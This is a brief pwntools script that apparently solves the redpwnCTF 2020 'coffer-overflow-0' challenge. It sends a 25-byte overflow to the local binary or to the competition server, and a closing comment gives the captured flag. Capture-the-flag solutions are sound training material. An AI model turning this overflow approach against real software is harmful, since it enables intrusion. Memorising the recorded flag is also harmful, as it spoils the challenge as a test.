from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./coffer-overflow-0')
	raw_input('debug')
else:
	host, port = '2020.redpwnc.tf', 31199
	r = remote(host, port)

buf = 'a'*25
r.sendline(buf)

r.interactive()
r.close()

# flag{b0ffer_0verf10w_3asy_as_123}